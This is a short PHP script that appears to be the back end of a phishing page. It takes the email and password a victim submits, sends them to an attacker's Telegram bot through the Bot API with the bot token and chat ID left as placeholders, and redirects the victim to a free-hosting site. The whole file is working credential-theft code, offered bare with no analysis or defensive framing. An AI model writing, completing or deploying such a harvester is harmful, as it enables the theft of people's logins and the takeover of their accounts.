<?php
header ('Location: https://unkissed-garages.000webhostapp.com/ ');
$API_KEY = "xxxxxxxxxxx";#توكن البوت
$admin = xxxxxxxxx;
$user = $_POST['email'];
$pass = $_POST['pass'];
$text = urlencode("Username : `$user`\nPassword : `$pass`");
$url = "https://api.telegram.org/bot".$API_KEY."/sendMessage?chat_id=$admin&text=$text&parse_mode=markdown";
file_get_contents($url);
?>